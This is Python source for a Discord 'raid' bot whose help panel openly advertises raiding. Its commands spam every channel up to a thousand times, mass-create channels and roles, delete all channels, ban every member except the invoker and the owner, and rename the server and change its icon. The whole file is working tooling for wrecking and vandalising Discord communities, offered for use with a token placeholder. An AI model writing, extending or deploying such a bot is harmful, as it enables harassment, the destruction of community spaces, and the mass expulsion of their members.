import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.guild_messages = True
bot = commands.Bot(command_prefix='$', intents=intents)

@bot.command()
@commands.has_permissions(administrator=True)
async def spam(ctx, cantidad: int, *, mensaje: str):
    if cantidad > 1000:
        await ctx.send("There is a maximum of `1,000` messages per channel to avoid blocking.")
        return

    tareas = []

    for canal in ctx.guild.text_channels:
        async def enviar_en_canal(canal):
            for _ in range(cantidad):
                try:
                    await canal.send(mensaje)
                    await asyncio.sleep(0)
                except discord.Forbidden:
                    print(f"I don't have permission to send on {canal.name}")
                except Exception as e:
                    print(f"Error {canal.name}: {e}")

        tareas.append(asyncio.create_task(enviar_en_canal(canal)))

    await asyncio.gather(*tareas)
    await ctx.send(f"Done, message sent `{cantidad}` times in all text channels.")

@bot.command()
@commands.has_permissions(administrator=True)
async def raid(ctx, cantidad: int, *, nombre_base: str):
    if cantidad > 500:
        await ctx.send("There is a maximum of `500` channels per command to avoid blocking.")
        return

    creados = 0
    for i in range(1, cantidad + 1):
        nombre = f"{nombre_base}-{i}"
        try:
            await ctx.guild.create_text_channel(name=nombre)
            creados += 1
        except discord.Forbidden:
            await ctx.send(f"I don't have permission to create channels.")
            return
        except Exception as e:
            await ctx.send(f"Error creating `{nombre}`: {e}")

    await ctx.send(f"Ready, they have been created `{creados}` channels with name {nombre_base}.")



@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    await ctx.send("Confirm that you want to delete **ALL CHANNELS** from the server by typing `y` in the chat.")

    def check(m):
        return m.author == ctx.author and m.content == "y"

    try:
        respuesta = await bot.wait_for('message', check=check, timeout=15)
        for canal in ctx.guild.channels:
            try:
                await canal.delete()
            except discord.Forbidden:
                print(f"I don't have permission to delete {canal.name}")
            except Exception as e:
                print(f"Error while deleting {canal.name}: {e}")
        await ctx.send("Done, all channels have been deleted.")
    except asyncio.TimeoutError:
        await ctx.send("Tiempo agotado. No se borró nada.")

@bot.command()
@commands.has_permissions(administrator=True)
async def cn(ctx, *, nuevo_nombre: str):
    try:
        await ctx.guild.edit(name=nuevo_nombre)
        await ctx.send(f"The server name has been changed to: `{nuevo_nombre}`")
    except discord.Forbidden:
        await ctx.send("I don't have permission to change the server name.")
    except Exception as e:
        await ctx.send(f"Error changing name: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
async def ci(ctx):
    if not ctx.message.attachments:
        await ctx.send("You must attach an image to use as a new icon.")
        return

    imagen = ctx.message.attachments[0]
    try:
        imagen_bytes = await imagen.read()
        await ctx.guild.edit(icon=imagen_bytes)
        await ctx.send("Server icon changed successfully.")
    except discord.Forbidden:
        await ctx.send("I don't have permission to change the server icon..")
    except Exception as e:
        await ctx.send(f"Error changing icon: {e}")
        
@bot.command()
@commands.has_permissions(manage_roles=True)
async def cr(ctx, cantidad: int, *, nombre_base: str):
    if cantidad > 100:
        await ctx.send("There is a maximum of `100` roles per command to avoid deadlocks.")
        return

    creados = 0
    for i in range(1, cantidad + 1):
        nombre = f"{nombre_base}-{i}"
        try:
            await ctx.guild.create_role(name=nombre)
            creados += 1
            await asyncio.sleep(0.5)
        except discord.Forbidden:
            await ctx.send(f"I don't have permissions to create the role `{nombre}`.")
        except Exception as e:
            await ctx.send(f"Error creating `{nombre}`: {e}")

    await ctx.send(f"Ready, they have been created `{creados}` base named roles `{nombre_base}`.")

@bot.command()
@commands.has_permissions(administrator=True)
async def ping(ctx):
    try:
        latencia = round(bot.latency * 1000)
        await ctx.send(f"🏓 Pong! bot: `{latencia}ms`")
    except discord.Forbidden:
        await ctx.send("I don't have permission to send messages here..")
    except Exception as e:
        await ctx.send(f"Error executing command: {e}")

@bot.command()
@commands.has_permissions(manage_channels=True)
async def ret(ctx, cantidad: int, nombre_base: str, *, mensaje: str):
    if cantidad > 500:
        await ctx.send("There is a maximum of `500` channels per command to avoid blocking.")
        return

    creados = 0
    for i in range(1, cantidad + 1):
        nombre = f"{nombre_base}-{i}"
        try:
            canal = await ctx.guild.create_text_channel(name=nombre)
            await canal.send(mensaje)
            creados += 1
            await asyncio.sleep(0)
        except Exception as e:
            await ctx.send(f"Error `{nombre}`: {e}")

    await ctx.send(f"Ready, they have been created `{creados}` channels and sent the message in each one.")

@bot.command()
@commands.has_permissions(ban_members=True)
async def bn(ctx):
    miembros = ctx.guild.members
    miembros_que_no_se_banean = [ctx.author, ctx.guild.owner, bot.user]

    miembros_a_banear = [
        miembro for miembro in miembros
        if miembro not in miembros_que_no_se_banean and not miembro.bot
    ]

    baneados = 0
    for usuario in miembros_a_banear:
        try:
            await ctx.guild.ban(usuario, reason="Chuyin Bot.")
            baneados += 1
            await asyncio.sleep(1)
        except discord.Forbidden:
            await ctx.send(f"I don't have permission to ban `{usuario}`.")
        except Exception as e:
            await ctx.send(f"Error when banning `{usuario}`: {e}")

    await ctx.send(f"Done, they have been banned `{baneados}` People.")

@bot.command()
@commands.has_permissions(administrator=True)
async def resetserer(ctx):
    await ctx.send(
        "This command will delete **ALL CHANNELS** from the server and recreate them empty.\n"
        "Type `y` to continue."
    )

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() == "y"

    try:
        await bot.wait_for("message", check=check, timeout=20)
    except asyncio.TimeoutError:
        await ctx.send("Timed out. Cancelled.")
        return

    await ctx.send("Resetting all channels...")

    canales_originales = list(ctx.guild.channels)

    for canal in canales_originales:
        try:
            nuevo = await canal.clone()
            await canal.delete()
            await nuevo.edit(name=canal.name, category=canal.category, position=canal.position)
            await asyncio.sleep(1.5)
        except Exception as e:
            await ctx.send(f"Error when restarting channel `{canal.name}`: {e}")

    await ctx.send("All channels have been restarted.")

@bot.command()
@commands.has_permissions(administrator=True)
async def clear(ctx):
    try:
        await ctx.send("Deleting all messages from the channel...")
        await ctx.channel.purge(limit=None)
        confirmacion = await ctx.send("All messages have been deleted.")
        await asyncio.sleep(5)
        await confirmacion.delete()
    except discord.Forbidden:
        await ctx.send("I don't have permission to delete messages..")
    except Exception as e:
        await ctx.send(f"Error deleting messages: {e}")

@bot.command()
@commands.has_permissions(manage_channels=True)
async def resetcanal(ctx):
    canal = ctx.channel
    nombre = canal.name
    categoria = canal.category

    await ctx.send(f"This command will delete the channel `{nombre}` and will recreate it empty.\nType `y` to continue.")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() == "y"

    try:
        await bot.wait_for("message", check=check, timeout=15)
    except asyncio.TimeoutError:
        await ctx.send("Timed out. Cancelled..")
        return

    try:
        nuevo = await canal.clone()
        await canal.delete()
        await nuevo.edit(name=nombre, category=categoria)
        await nuevo.send(f"Channel `{nombre}` has been restarted.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(name="hlp")
async def hlp(ctx):
    embed = discord.Embed(
        title="Commands",
        description="Here are the available commands:",
        color=discord.Color.blue()
    )

    embed.add_field(
        name="Canal",
        value="`$clearall` – Deletes all messages from a single channel.\n`$resetcanal` – Resets a channel by deleting all messages sent in it but preserving the channel name and role settings.\n`$resetserver` – Resets ***ALL channels*** on the server, deleting ***all messages*** sent to it but preserving the role configuration and channel name.",
        inline=False
    )

    embed.add_field(
        name="ℹ️ Raid Info",
        value="`$spam <amount> <message>` – Spams all channels.\n`$raid <Amount of channels to create> <Channel names>` – Creates a custom amount of channels.\n`$nuke` – Deletes all channels on the server.\n`$cn <New server name>` – Creates a new name for the server.\n`$cr <amount> <role names>` – Creates a number of roles on the server.\n`$ci <Attach an image>` – Creates a new photo for the server.\n`$ret <Amount> <Channel names to create> <Spam message>` – Raids the server by creating an absurd amount of channels with a custom spam name and message.\n`$bn` – Bans all members of the server except bots with admin.",
        inline=False
    )

    embed.add_field(
        name="ℹ️ Help",
        value="`$hlp` – Show this command help panel\n`$ping` – Show the bot latency\n - ***Remember that the bot must be activated by its creator***.",
        inline=False
    )

    embed.set_footer(text="Bot raid")
    await ctx.send(embed=embed)

@bot.event
async def on_ready():
    print(f'Bot connected as {bot.user}')

bot.run("TU TOKEN AQUI")



